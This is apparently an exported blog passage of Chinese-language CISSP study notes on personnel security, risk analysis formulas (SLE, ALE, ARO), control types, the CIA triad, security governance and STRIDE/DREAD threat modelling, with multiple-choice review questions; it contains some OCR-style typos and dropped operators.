    <content type="text"><![CDATA[在本章的考试大纲内容有：安全和风险管理(例如安全、风险、合规性、法律、法规、业务连续性) H. 促进人员安全策略 H.l 筛选候选人(例如背景检测、教育核查) H.2 雇佣协议和策略 H.3 解雇员工的流程 H.4 供货商、顾问和承包商控制 H.5 合规性 H.6 隐私 I. 理解和应用风险管理的概念 I.1 识别威胁和脆弱性 I.2 风险评估/分析(定性、定量、混合) I.3 风险分配/接受(例如系统授权) I.4 措施选择 I.5 实施 I.6 控制类型(阻止、检测、纠正等) I.7 控制评估 I.8 监控和测量 I.9 资产评估 I.10 报告 I.11 持续改进 I.l2 风险框架 L. 建立和管理信息安全教育、培训和意识 L.l 适合组织需要的水平的安全意识、培训和教育 L.2 定期的内容相关审查安全评估与测试(设计、执行和分析安全测试) C.5 培训和意识 2.1 促进人员安全策略 在任何安全解决方案中，人都是最薄弱的环节。无论部署怎样的物理或逻辑控制，人总能发现避免受到控制、回避或消除控制以及禁用控制的方法。在构建工作描述方面的重要元素包括职责分离、工作职责和岗位轮换： 职责分离 职责分离属于安全概念，是指把关键的、重要的和敏感的工作任务分配给若干不同的管理员或高级执行者。这样做能阻止任何一个人具备破坏或削弱重要安全机制的能力。可以将职责分离视为对管理员的最小特权原则的应用。职责分离也能够防止共谋，共谋指的是负面活动由两人或多人共同完成，其意图往往是伪造、偷窃或间谍行为。 工作职责 工作职责是要求员工在常规的基础上执行的特定工作任务。根据他们的职责，员工需要访问各种不同的对象、资源和服务。在安全的网络上，用户必须被授予访问与其工作任务有关元素的权限。为了保持最大的安全性，应该按照最小特权原则分配访问权限。最小特权原则规定：在安全环境中，应该授予用户完成工作任务或工作职责所必需的最小访问权限。这条原则的实际应用要求对所有资源和功能进行低级别的粒度访问控制。 岗位轮换 岗位轮换是一种简单的方法，组织通过让员工在不同的工作岗位间轮换职位来提高整体安全性。岗位轮换有两个作用。首先，它提供了一种知识冗余类型。当许多员工中的每一位都有能力胜任所要求的若干工作岗位时，如果因为疾病或其他事件导致一位或多位员工在较长的时间内无法工作，那么组织遭受严重停工或生产效率降低的可能性就较小。 2.1.1 筛选候选人 对于职位的安全性来说，背景调查和安全检查是证明候选人能够胜任工作、具备工作资格和值得信赖的必要因素。 2.1.2 雇佣协议和策略 雇佣新员工时，应该签署雇佣协议。协议文档概略说明了组织的规则和限制、安全策略、可接受的使用和行为准则、详细的工作描述、破坏活动及其后果、要求员工胜任工作所需的时间。其中，很多条目都是独立的文挡。 保密协议(NonDisclosure Agreement，NDA)用来保护组织的机密信息不会被以前的员工泄漏。 2.1.3 解雇员工的流程 离职面谈的主要目的是： 根据前雇员签署的雇佣协议、保密协议和其他安全相关文档来审查责任和约束条件。以下列出了应该尽快处理的其他事直： 确认员工己归还放在交通工具或家中的组织配发的装置或供应品。 删除或禁用员工的网络用户账号。 通知人力资源部门支付最后的薪水，把未使用的休假换成工资，终止所有的福利待遇。 安排安全部门的人员陪同被解雇的员工在工作场所收拾他们的个人物品。 通知所有安全人员以及监控出入口的其他人员，确保被解雇的员工只能在安全人员护送下再次进入工作场所。 2.1.4 供应商、顾问和承包商控制服务级别协议(Service-Level Agreement，SLA)中处理的常见问题： 系统运行时间(作为总体运行时间的百分比) 最长连续停机时间( 以秒或分钟等计算) 最大负载 平均负载 诊断任务 故障转移时间(如果冗余处于适当位置) 2.1.5 合规性 合规是符合或遵守规则、策略、法规、标准或要求的行为。 2.1.6 隐私 主动防止对个人可确认的信息(也就是与某人或某个组织直接联系的数据点)的未授权访问。 防止对被视为个人的或秘密的信息进行未授权的访问。 防止未被同意或知晓的观察、监控或检查行为。 2.2 安全治理 安全治理是与支持、定义和指导组织安全工作相关的实践集合。 2.3 理解和应用风险管理概念 风险管理的主要目的是要将风险降低到一个可以接受的级别。达到风险管理主要目标的过程被称为风险分析。风险分析包括： 分析环境中的风险 评估每种风险发生的可能性和造成的损失 评估各种风险对策的成本以及生成安全措施的成本/效益报告并呈交给上级管理者 2.3.1 风险术语 资产 资产是指环境中应该加以保护的任何事物，是用于商业过程和任务中的任何东西。 资产估值 资产估值指的是根据实际的成本和非货币性支出为资产分配的货币价值。 威胁 任何可能发生的、为组织或某种特定资产带来所不希望的或不想要结果的事情都被称为威胁。 脆弱性 资产中的弱点或防护措施/对策的缺乏被称为脆弱性。 暴露 暴露是指由于威胁而容易造成资产损失，脆弱性会被或将被威胁主体或威胁事件加以利用的可能性是存在的。 风险 风险是某种威胁利用脆弱性并导致资产损害的可能性，是对可能性、概率或偶然性的评估。 防护措施 防护措施或对策是指能消除脆弱性或对付一种或多种特定威胁的任何方法。 攻击 攻击指的是威胁主体对脆弱性的利用。 破坏 破坏是指发生安全机制被威胁主体绕过或阻挠的事情。 2.3.2 识别威胁和脆弱性 威胁可能来自任何地方。编制威胁列表时，需要考虑以下各项： 病毒 级联错误(一系列逐步上升的错误)和相关性错误(由于依赖的事件或事物不存在而引起) 己授权用户的犯罪行为 运动现象(振动、炸裂声等) 有企图的攻击 重组 己授权的用户疾病或传染病 黑客 不满的员工 用户错误 自然灾害(地震、水灾、火灾、火山爆发、咫风、龙卷风、海啸等) 物理损坏(碎裂、抛射、线缆被切断等) 数据、资源或服务的误用 对数据分类或安全策略的改变或危害 政府、党派或军队的入侵或限制 处理错误、缓冲区溢出 滥用个人特权 温度失控 能量异常( 静电噪音、EM 脉冲、无线电频率、电源损耗、电涌等) 数据丢失 信息战争 破产或改变/中断业务活动 编码/编程错误 入侵(物理的或逻辑的) 环境因素(存在天然气、液体、生物等) 设备故障 物理盗窃 社会工程学 2.3.3 风险评估/分析 目前有两种风险评估方法： 定量的风险分析和定性的风险分析。定量的风险分析把真实的货币价值分配给损失的资产。定性的风险分析把主观的和无形的价值分配给损失的资产。 定量的风险分析 定性的风险分析 2.3.4 风险分配/接受风险分析的结果包括： 所有资产的完整且详细的评估。 所有威肋和风险、发生概率以及一旦发生的损失范围的详细列表。 针对特定威胁的并且标识出有效性与ALE的防护措施和对策列表。 每种防护措施的成本/效益分析。 2.3.5 对策的选择和评估 对策和防护措施需要根据业务任务的上下文进行评估。 2.3.6 实施 安全控制、对策和防护措施可以通过行政管理性、逻辑/技术性或物理性控制来实现。 2.3.7 控制的类型 1.威慑 2.预防 3.检测 4.补偿 5.纠正 6.恢复 7.指令 2.3.8 监控和测量2.3.9 资产评估对有形资产和无形资产的估值： 购置成本 开发成本 经营或管理成本 维护或保养成本 获得资产的成本 保护或维持资产的成本 所有者和用户的价值 竞争者的价值 知识产权或资产的价值 市场评估(可维持的价格) 产品换代成本 生产率提升或下降 资产存在和损失的运营成本 资产损失责任 用处 2.3.10 持续改进 安全性总是在不断变化。因此，随着时间的推移，任何己经实现的安全解决方案都需要更新和更改。如果不是由选定的对策提供连续的完善路径，那么应该将其替换为可以为安全性提供灵活改进的对策。 2.3.11 风险框架风险管理系统有以下特点： 通过实施强劲且持续不断的监管过程促进实时风险管理概念和不间断的信息系统授权概念的提升。 鼓励通过自动化操作，向高层领导者提供必要的信息以帮助他们在组织信息系统方面做出基于风险且划算的决定，以支持他们的核心任务和商业功能。 将信息安全与公司系统结构以及系统开发生命周期相结合。 强调选择、实施、评估、安全控制的监管以及信息系统的授权。 通过风险管理(功能)将信息系统层面的风险管理过程与组织层面的风险管理过程相联系。 为部署在组织信息系统中井使用这些系统的安全控制建立责任和问责一体化制度。风险管理系统的步骤包括： 分类 选择 实施 评估 授权 监控 2.4 建立和管理信息安全教育、培训和意识 安全培训的先决条件是意识。培养安全意识的目标是要将安全放到首位并让用户认识到这一点。意识在整个组织机构之间建立了通用的安全理解基线或基础。 2.5 管理安全功能 安全必须符合成本效益原则 安全必须可度量 安全机制本身和安全治理过程都会消耗资源 安全管理功能包括信息安全策略的开发和执行 2.6 考试要点 知道隐私如何被放入IT 安全领域 知道隐私的多重含主U定义，为什么保护它是非常重要的，以及围绕隐私尤其是在工作环境中的隐私的各种问题。 能够讨论安全的第三方治理 第三方治理的监督制度可以根据法律、法规、行业标准或许可要求进行强制执行。 能够定义整体的风险管理 风险管理的过程如下： 识别可能造成数据损坏或泄漏的因素、根据数据的价值与对策的成本来评估这些因素，以及实现能够减轻或降低风险的有成本效益的解决方案。通过执行风险管理，就能够为降低整体风险奠定基础。 理解风险分析及涉及的要素 执行风险分析能够为上层管理者提供详细、必要的依据，从而使其决定哪些风险应当被削弱、哪些风险应当被转移以及哪些风险应当被接受。为了全面评估风险和随后采取恰当的防范措施，就必须分析下列要素： 资产、资产估值、威胁、脆弱性、暴露、风险、己发生的风险、防护措施、对策、攻击和突破。 知道如何评估威胁 威胁可能有很多来源，包括町、人和自然界。以团队的形式评估风险以便提供范围最广的视角。通过从各个角度全面地评估风险，就可以减少系统的脆弱性。 理解定量的风险分析 定量的风险分析关注硬性指标和百分比。全部使用定量分析是不可能的，因为风险的某些方面是无形的。定量的风险分析过程涉及： 资产估值和威胁识别，接着确定威胁发生的潜在频率和损失，结果是防护措施的成本/效益分析。 能够解释暴露因子(EF)的概念 暴露因子是定量风险分析的一个元素，表示组织的某种特定资产被己发生的风险损坏后造成损失的百分比。通过计算暴露因子，能够较好地实现风险管理策略。 了解单一损失期望(SLE)井知道如何计算 SLE是定量风险分析的一个元素，表示与针对特定资产的单个己发生风险相关联的成本。计算SLE时，可以使用公式： SLE=资产价值(AV) *暴露因子(EF)。 理解年发生比率(ARO) ARO是定量风险分析的一个元素，指的是特定威胁或风险在一年内将会发生(也就是成为现实)的预计频率。理解ARO能够进一步计算风险和采取适当的防范措施。 了解年度损失期望(ALE)井知道如何计算 ALE是定量风险分析的一个元素，指的是针对某种特定的资产，所有己实施的威胁每年可能造成的损失成本。计算ALE 时可以使用公式： ALE=单一损失期望(SLE)*年发生比率(ARO)。 了解评估防护措施的公式 除了确定防护措施每年的成本外，还必须计算实现措施后资产的ALE。为此，可以使用下面这个公式： 实现防护措施前的ALE- 实现防护措施后的ALE-每年的防护措施成本=公司防护措施的价值，即(ALEl - ALE2) - ACS。 理解定性的风险分析 定性的风险分析更多是根据场景而不是根据计算。这种方式不是为可能发生的损失分配准确的货币价值，而是按程度将威胁分成等级，从而评估其风险、成本和影响。这些分析结果可以帮助那些负责制定风险管理策略的人。 理解Delphi技术 Delphi技术只是一个简单的匿名反馈和响应过程，这个过程被用于达成一致意见。达成的一致意见为责任方提供了正确评估风险和实施解决方案的机会。 了解处理风险的选项 降低风险或风险缓解是防护措施和对策的实现。风险转让或转移风险是把风险带来的损失成本转移给另一个实体或组织。购买保险就是转让或转移风险的一种常见形式。接受风险是因为管理层对可能采用的防护措施进行了成本/效益分析上的评估，并且确定对策的戚本远远超过风险可能造成的损失的成本，还意味着管理层己经同意接受风险发生所造成的结果和损失。 能够解释总风险、剩余风险和控制间隙 总风险指的是在没有实现防护措施的情况下，组织将要面对的风险数量。计算总风险的公式是： 威胁脆弱性资产价值=总风险。剩余风险是管理层选择接受而不是缓解的风险。总风险和剩余风险之间的差值被称为控制间隙，控制间隙是指通过实现防护措施被减少的风险数量。计算剩余风险的公式是： 总风险控制间隙=剩余风险。 理解控制类型 “访问控制”这一术语指的是一系列执行以下任务的控制=确保只有授权用户能够登录而未授权用户不能访问资源。控制类型包括预防、测探、校正、警报、恢复、指令和补偿控制。按执行方式控制可分为：行政管理性控制、逻辑性控制或物理性控制。 理解雇佣新员工的安全含义 为了制定合适的安全计划，必须具有工作描述、工作分类、工作任务、工作职责、阻止共谋、候选人筛选、背景调查、安全许可、雇佣协议和竞业禁止协议的标准。通过部署这些机制，确保新雇佣的人员意识到要求的安全标准，从而保护组织的资产。 能够解释职责分离 职责分离属于安全概念，指的是将关键的、重要的和敏感的工作任务分配给不同的人。通过分离责任这种方式，就可以确保任何人不可能危及系统安全。 理解最小特权原则 最小特权原则表明，在安全环境中，用户应该被授予完成要求的工作任务或工作职责所必需的最少访问权限。通过限制用户只能访问完成工作任务所要求的那些资源，就能限制敏感信息的脆弱性。 了解岗位轮换和强制性休假是必要的 岗位轮换有两个作用： 提供了一种知识元余类型： 人员流动可以减少伪造、数据更改、偷窃、阴谋破坏和信息滥用的风险。一到两个星期的强制性休假被用于审计和认证员工的工作任务和权限。这种做法往往比较容易发现滥用、欺诈或疏忽行为。 理解供应商控制、顾问控制和承包商控制 利用供应商控制、顾问控制以及承包商控制来确定这个主要组织外部的不同实体、个人或机构的绩效水平、期望值高低、薪酬水平以及影响程度。通常情况下，服务水平协议(SLA) 的文件或政策中会对这些控制进行明确规定。 能够解释适当的解雇策略 解雇策略定义了解雇员工的过程，应当包括： 始终有一位证人在场，禁止员工访问网络，进行离职面谈，护送员工离开办公室，交回安全标志和门卡，返还公司的财产。 了解如何实现安全意识培训 在真正的培训开始之前，必须让用户树立主人翁的安全意识。一旦树立了安全意识，培训或教育员工执行工作任务和遵守安全策略就可以开始了。所有的新员工都需要进行培训。这样他们才能够遵守安全策略中规定的所有标准、指导方针和步骤。教育是一项更细致的工作，学生/用户需要学习比他们完成工作任务实际所需知识多得多的知识。教育往往与用户参加认证考试或寻求职务晋升相关联。 理解如何管理安全功能 为了实现管理安全功能，组织必须采取恰当且充分的安全治理。执行风险评估以驱动安全政策的施行是最明显、最直接的安全功能管理例子。同时这也和预算、度量、资源以及信息安全策略以及评估安全系统的完整性及有效性息息相关。 了解风险管理框架的6个步骤 风险管理框架的6 个步骤分别是： 分类、选择、实施、评估、授权和监控。 2.7 复习题 以下哪一项是任何安全解决方案中最薄弱的元素?A. 软件产品B. 互联网连接C. 安全策略D. 人 当试图雇佣新员工时，首先要做什么?A. 创建工作描述B. 设置职位分类C. 审查候选人D. 要求简历 以下哪一项是离职面谈的主要目的?A. 返还离职员工的个人物品。B. 审查保密协议。C. 评估离职员工的表现。D. 取消离职员工的网络访问账户 当员工被解雇时，接下来应该做什么?A. 在他们被正式解雇前几个小时通知员工。B. 一旦他们被通知解雇，就禁用员工的网络访问权。C. 发送一封广播的电子邮件通知大家，某个员工将被解雇。D. 等到你和雇员是楼里唯一剩下的人时宣布解雇。 如果一个组织与外部实体签订合同，提供关键业务功能或服务，例如账户或技术支持。用于确保这些实体能够提供充分的安全性的流程被称为什么?A. 资产识别B. 第三方管理C. 离职审查D. 定性分析 ___的一部分是业务流程和组织策略的逻辑和实际调查。这个过lV策略审查确保定期的和执行的业务任务、系统和方法是可行、有效的，并且具有成本效益，但最重要的是(至少相对于安全治理)，他们通过减少脆弱性和避免、减少或缓解风险来支持安全性。A. 混合评估B. 风险规避过程C. 对策选择D. 文档审查 以下哪一项不是正确的?A. IT安全只能针对逻辑性或技术性的攻击提供保护。B. 实现风险管理目标的过程被称为风险分析。C. 对于IT基础设施的风险是以所有计算机为基础的。D. 资产是在业务流程或任务中使用的任何东西。 下列哪一项不是风险分析过程中的元素?A. 为风险分析环境。B. 为防护措施创建成本/收益报告并提交给上层管理者。C. 选择适当的防护措施并实施它们。D. 评估每个威胁事件，及其发生和造成损害的成本和可能性。 在风险分析中，下列哪一项一般不会被认为是资产?A. 开发过程B. IT基础设施C. 专有的系统资源D. 用户的个人文件 以下哪一项表示偶然的或有意的漏洞利用?A. 威胁事件B. 风险C. 威胁代理D. 破坏 当没有或缺乏防护措施和对策时，会存在什么?A. 脆弱性B. 暴露C. 风险D. 渗透 下列哪一项不是有效的风险定义?A. 几率、可能性或机会的评估B. 移除脆弱性或防止一个(或多个)特定攻击发生的任何事情C. 风险=威胁*脆弱性D. 每个暴露实例 当评估防护措施时，在大多数情况下应遵循什么规则?A. 资产年度损失期望成本不应该超过年度的保护成本。B. 防护措施的年度成本应该等于资产价值。C. 防护措施的年度成本不应该超过资产的年度损失期望。D. 防护措施的年度成本不应该超过安全预算的10%。 单一损失期望是怎样计算的?A. 威胁+脆弱性B. 资产价值暴露因子C. 年发生比率脆弱性D. 年发生比率资产价值暴露因子 一家公司的防护措施的价值怎样计算?A. 使用防护措施前的ALE-使用防护措施后的ALE 防护措施的年度成本B. 防护前ALE*防护措施的AROC. 执行防护后ALE+年度防护价值-控制间隙D. 总风险一控制间隙 什么安全控制直接关注于防止共谋?A. 最小特权原则B. 工作描述C. 职责分离D. 定量的风险分析 什么样的流程或事件通常是由组织主持，针对具有相似工作职能的员工群体?A. 教育B. 意识C. 培训D. 解雇 以下哪一项没有具体或直接关系到组织的安全功能管理?A. 员工工作满意度B. 度量C. 信息安全策略D. 预算 由于缺少灭火器，你意识到一场火灾的威胁和脆弱性，然后开始执行风险分析。基于这些信息，下列哪些是可能的风险?A. 病毒感染B. 设备损坏C. 系统故障D. 未授权地访问机密信息 20 通过特定的威胁/脆弱性/风险关系，己经执行了基本的定量风险分析。选择一个可能的对策。当再次计算时，下列哪个因素会变化?A. 暴露因子B. 单一损失期望C. 资产价值D. 年发生比率]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（1）——通过原则和策略的安全治理]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5%E7%9A%84%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：安全和风险管理(例如安全、风险、合规性、法律、法规、业务连续性) A. 理解和应用机密性、完整性和可用性的概念 B. 应用安全治理原则，通过： B.1 安全功能与战略、目标、使命和愿景的一致(例如商业案例、预算和资源) B.2 组织的流程(例如并购、剥离和治理委员会) B.3 安全角色和职责 B.4 控制架构 B.5 应尽关注 B.6 应尽职责 F. 开发和实现文档化的安全策略、标准、程序和指南 J. 理解和应用威胁建模 J.1 识别威胁(例如竞争对手、供应商、雇员和值得信赖的伙伴) J.2 确定和用图表示潜在攻击(例如社会工程学、欺骗) J.3 执行降低分析 J.4 修复威胁的技术和流程(例如软件架构和操作) K. 把安全风险考虑到收购策略和实践中 K.l 硬件、软件和服务 K.2 第三方评估和监控(例如现场评估、文件传递和审查、流程/策略审查) K.3 最小化安全需求 K.4 服务级别需求 1.1 理解和应用机密性、完整性和可用性的概念 安全的三要素：C(机密性-Confidentiality)I(完整性-Integrity)A(可用性-Availability) 1.1.1 机密性 如果安全机制提供机密性，那么它就为限制未授权主体不能访问数据、客体或资源提供了高级别保证。如果存在对机密性的威胁，那么就有可能发生未授权的泄漏。机密性的其他概念、条件和特征包括： 敏感性 敏感性是指信息的品质，如果这种信息被披露，就可能会造成伤害或损坏。维护敏感信息的机密性有助于预防伤害或损坏。 自主性 自主性是一种决策行为，操作员可以凭这种权利影响或控制信息的披露，以便将伤害或损坏降到最低。 关键性 信息的关键级别是对其关键性的评测。关键级别越高，越需要保持信息的机密性。高级别的关键性对一个组织的运营和功能是必不可少的。 隐蔽性 隐蔽是一种隐蔽或防止披露的行为。隐蔽通常被视为覆盖、混淆或干扰的一种手段。 保密性 保密是一种保守秘密或防止信息泄露的行为。 隐私性 隐私是指要保持信息处于机密状态，这些可能是个人识别信息，或是如果泄露就可能对某人造成伤害、尴尬或丢人的信息。 隐藏性 隐藏就是把信息存储到一个偏僻的位置。这个位置还可以附加严格的访问控制。隐藏有助于实施机密性保护。 隔离性 隔离是指把特定信息与其他信息分隔开来的行为。隔离可以用来防止信息混杂或信息泄露。 1.1.2 完整性 为了维护完整性，客体必须保持自身的正确性，并且只能由被授权的主体进行有意修改。我们可以从下列三个方面查看完整性： 应该禁止未授权的主体执行修改操作。 应该禁止经过授权的主体执行未授权的修改操作，例如失误。 客体应当内外保持一致，这样它们的数据才能正确井真实地反映现实情况，并且与任何子客体、同等客体或父客体的关系都是有效的、一致的和可检验的。 1.1.3 可用性 可用性指的是经过授权的主体被及时准许和不间断地访问客体。 1.1.4 其他安全概念 身份标识身份标识是一个过程，在这个过程中，主体会表明身份，并且开启可问责性。主体必须向系统提供身份，从而启动身份认证、授权和可问责性的过程。 身份认证身伤1证要求来自主体的附加信息必须完全对应于被表明的身份。 授权授权的过程确保被请求的活动或客体访问，可以获得通过身份认证和指派的权利和特权。 审计审计或监控是程序化方式，通过这种方式，主体在系统中经过身份认证的行为是可问责的。 可问责性通过审计、授权、身份认证与身份标识这些安全服务和机制，将联机身份的活动与某个人联系在一起，就可以建立可问责性。 不可否认性不可否认性确保活动或事件的主体无法否认所发生的事件。不可否认性能够防止主体宣称自己没有发送消息、没有执行过某项活动或者不是某个事件的起因。 1.1.5 保护机制 分层分层只是简单地使用连续的多重控制，也被称为深层防御。使用连续分层法而不是并行分层法，这一概念非常重要。通过连续方式执行安全限制意味着使用线性的方式依次执行。只有通过一系列配置，才能由每个安全控制对攻击进行扫描、评估或缓解。单个安全控制方法的失败不会使整个解决方案失效。如果安全控制是以并行方式执行的，某个威胁就可能穿过单个检查点，从而无法消除该威胁特殊的恶意活动。 抽象抽象是为提高效率而使用的。相似的元素被放入组、类别或角色(被整体性授予安全控制、限制或权限)中。因此，当为客体分类或为主体分配角色时，就需要使用抽象的概念。 数据隐藏数据隐藏通过将数据置于主体不可访问或无法看到的存储空间，从而防止主体发现或访问数据。 加密加密可以具有很多形式，并且能够被应用于所有的电子通信类型，包括文本、音频和视频文件以及应用程序本身。 1.2 应用安全治理原则 安全治理是实践行为的集合，这些实践都与支持、定义和指导组织的安全工作相关。安全治理与组织和IT治理密切相关，而且经常交织在一起。这三种治理的目标一般是相同或相关的。 1.2.1 安全功能战略、目标、任务和愿景的一致 解决安全管理计划编制的最有效方法是采用自上而下的方式。上层、高层或管理部门负责启动和定义组织的安全策略。安全策略为组织中较低级别的人员指出了方向。中层管理部门的职责是在安全策略的指导下制定标准、基准、指导方针和程序。接着，操作管理者或安全专家负责实现在安全管理文档中规定的配置要求。最后，最终用户必须遵守组织制定的所有安全策略。安全管理计划编制的元素包括： 定义安全角色 规定如何管理安全性、谁负责安全性以及如何测试安全性的效力 开发安全策略 执行风险分析 以及要求对员工进行安全教育 1.2.2 组织流程1 . 变更控制/变更管理 变更管理应该用于监督系统每个方面发生的变更，包括硬件配置、操作系统和应用软件的变更。变更管理应该被包含在设计、开发、测试、评估、实现、分发、演变、发展、持续操作以及修改中。变更管理不仅需要每个组件和配置的详细目录，而且还需要为每个系统组件(从硬件到软件，以及从配置设置到安全特性)收集和维护完整的文档。配置或变更管理的变更控制过程具有以下几个目标或要求： 以受监控的和有序的方式实现变更。变更总是处在控制之下。 包含正式的测试过程，这种过程用于确认变更产生的预期结果。 所有的变更都可以撤消(也被称为回退或回滚计划/流程)。在变更发生前向用户发出通知，避免降低生产率。 对变更的影响应进行系统分析。 变更对能力、功能和性能产生的负面效应最小化。 变更由变更审批委员会(Change Approval Board ，CAB)审阅和批准。 2 . 数据分类 数据分类方案的主要目的是： 根据重要性和敏感性给数据分配标签，对数据安全保护过程进行规范化和层次化。数据分类用于为数据存储、处理和传输提供安全机制，此外还可以确定如何从系统中删除数据和销毁数据。使用数据分类方案具有下列优点： 能够证明组织致力于保护宝贵的资源和资产。 能够有助于确定对组织最关键的或最有价值的资产。 为安全机制的选择提供安全保证。 常常是遵守规范或法律约束所必需的。 帮助定义访问级别、授权使用类型，以及对不再有价值的资源进行解除分类和/或对于销毁操作所需的参数。 在数据生命周期管理中，对于确定数据的存储(保留)时长、使用和销毁是有帮助的。 1.2.3 安全角色和责任 高级管理 安全专家 数据所有者 数据管理员 用户 审计人员 1.2.4 控制架构 安全计划步骤中最重要的一步，也是第一步，就是考虑组织想要的安全解决方案的整体控制框架或结构。 1.3 开发和文档化安全策略、标准、指导方针和程序1.3.1 安全策略 规范化的最高层次被称为安全策略。安全策略是一个文挡，这个文档定义了组织所需的安全范围，并且讨论了需要保护的资产以及安全解决方案为提供必要保护而应当涉及的范围。安全策略概述或归纳了组织的安全需求，定义了主要的安全目标，井且概述了组织的安全架构。安全策略还确定了数据处理的主要功能领域，并且澄清和定义了所有相关的术语。安全策略应当清楚地定义为什么安全性很重要以及哪些资产是有价值的。它是实现安全性的战略计划。安全策略应当广泛地概括出用于保护组织切身利益的安全目标和原则。文档讨论了安全性对于日常营业每个方面的重要性以及高层职员对实现安全措施予以支持的重要性。安全策略被用于分配职责、定义角色、指定审计要求、概述实施过程、指明遵循要求以及定义可接受的风险级别。这个文档通常用于证明高层管理部门为保护不遭受入侵、攻击和灾难予以应有的关注。安全策略是强制性的。 从安全策略可以引出完整安全解决方案所需的其他很多文档或子元素。策略是广泛的概述，而标准、基准、指导方针和程序包括了更加特定的、详细的与实际安全解决方案有关的信息。标准处于安全策略的下一个层次。 1.3.2 安全标准、基准及指南 标准为硬件、软件、技术和安全控制方法的统一使用定义了强制性要求。标准提供了操作过程，在这个过程中，整个组织内部统一实现技术和措施。标准是战术文档，定义了达到安全策略指定的目标和总体方向的步骤或方法。 基准定义了安全性的最低级别，组织中的所有系统都必须达到基准要求。没有达到基准的所有系统都应该被排除在生产系统之外，直至这些系统被提升达到基准要求为止。基准建立了通用的安全状态基础，所有附加的和更严格的安全措施可以被建立在这个基础之上。基准通常是系统特定的，并且往往指的是行业或政府标准. 指南是规范化安全策略结构的下一个元素。指南提供了如何实现标准和基准的建议，井且能够作为安全专家和用户的操作指南。指南概述了一套方法(包括行动建议)，但并非强制性的。 1.3.3 安全程序 程序是规范化安全策略结构的最后一个要素。程序是详细的、按部就班的指导文档，它描述了实现特定安全机制、控制或解决方案所需的确切行动。 1.4 理解和应用威胁建模 威胁建模是潜在威胁被识别、分类和分析的安全流程。威胁建模的主动式方法发生于系统开发的早期阶段，特别是在初始设计和规范建立阶段。这种类型的威胁建模也被称为防御方式。这种方式基于编码和制作流程中对威胁的预测和特定防御中的设计，而不是依靠部署后的更新和补丁。威胁建模的被动式方法发生在产品被创建和部署之后。此部署可以在测试或实验室环境中，或是指被部署到一般市场上。这种类型的威胁建模也被称为对抗方式。这种威胁建模的技术是道德黑客攻击、渗透测试、代码审查和模糊测试背后的核心概念。 1.4.1 识别威胁 关注资产 这种方法使用资产的估值结果，并试图识别对于宝贵资产的威胁。例如，可以评估一个特定的资产，以确定其是否容易受到攻击。如果资产寄存着数据，则可以评估访问控制来识别能够绕过身份认证或授权机制的威胁。 关注攻击 一些组织能够识别潜在的攻击者，并能够基于攻击者的目标识别他们所代表的威胁。例如，政府往往能够识别潜在的攻击者，井识别攻击者想要达到的目标。然后他们可以使用这种知识来识别并保护他们的相关资产。这种方法面临的一个挑战是，可能会出现以往未被视为一种威胁的新攻击者。 关注软件 如果一个组织开发了一个软件，则可能会考虑针对软件的潜在威胁。尽管几年前组织一般不自己开发软件，但如今这己非常常见。具体地说，大多数组织都有网络存在，许多都创建了自己的网页。精美的网页带来更多的流量，但他们也需要更复杂的编程，并会受到更多的威胁。 STRIDE威胁分类方案经常用于对应用程序或操作系统威胁的评估。它包含： 电子欺骗(Spoofing) 篡改(Tampering) 否认(Repudiation) 信息披露(Information disclosure) 拒绝服务(DoS) 权限提升(Elevation of privilege) 1.4.2 确定和用图表示潜在攻击 1.4.3 执行降低分析 执行降低分析是为了分解应用程序、系统或环境。这个任务的目的是更好地理解产品逻辑及其与外部的交互元素。在这个分解流程中，必须了解5个关键概念： 信任边界信任或安全等级发生改变的位置。 数据流路径数据在两个位置之间的流动。 输入点接收外部输入的位置。 特权操作需要比标准用户账户或流程有更大特权的任何活动，通常需要进行系统修改或改变安全性。 安全立场和方法细节安全策略、安全基础和安全假设的声明。 1.4.4 优先级和响应 编制文档后，要对威胁进行排序或定级。可以利用各种技术完成这个过程，如使用概率×潜在损失的排名、高/中/低评级或DREAD系统。设计DREAD 评级系统是为了提供灵活的评级解决方案，其基于对每种威胁的5个主要问题的回答： 潜在破坏一一如果威胁成真，可能造成的损失有多严重? 再现性一一攻击者重现这一漏洞有多复杂? 可利用性一一实施攻击有多难? 受影响用户一一有多少用户可能受到攻击的影响(按百分比)7 可发现性攻击者发现弱点会有多难? 通过询问这些以及潜在的额外自定义问题，并对这些回答标注目M几或3/2/1 值，就可以建立一张详细的威胁优先级表。 1.5 考试要点 理解CIA三元组的元素：机密性、完整性和可用性 机密性是客体不能暴露给未授权主体的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。完整性是客体保持自身的正确性以及只能由己授权主体进行有意识修改的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。可用性是经过授权的主体被及时准许和不被打断地访问客体的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。 能够解释身份标识是如何工作的 身份标识是一个过程，在这个过程中，主体会表明身份，并且开始提供可问责性。主体必须向系统提供身份，从而启动身份认证、授权和可问责的过程。 **理解身份认证的过程。认证或测试所声明身份合法性的过程就是身份认证。身份认证要求来自主体的附加信息必须完全对应于被表明的身份。 了解如何在安全计划中实现授权 一旦主体通过了身份认证，其访问还必须经过授权。授权的过程确保请求的活动或客体访问，可能获得了为通过身份认证的身份而指派的权利和特权。 理解安全治理 安全治理是关于组织支持、定义和指导安全工作的实践集合。 能够解释审计过程 审计或监控是程序化方式，通过这种方式，主体在系统中经过身份认证的行为是可问责的。审计也是对系统中未经授权的或异常的活动进行检测的过程。我们需要通过审计来检测主体的恶意行为、入侵企图和系统故障以及重构事件，为起诉提供证据、生成问题报告和分析结果。 理解可问责性的重要性 只有在支持可问责性时，组织的安全策略才能够被正确实施。换句话说，只有在主体的活动可问责时，才能够保持安全性。有效的可问责’性依赖于检验主体身份以及跟踪其活动的能力。 能够解释不可否认性 不可否认性确保活动或事件的主体无法否认所发生的事件。不可否认性能够防止主体宣称自己没有发送消息、没有执行过某项活动或者不是某个事件的起因。 理解安全管理计划编制 安全管理基于三种类型的计划： 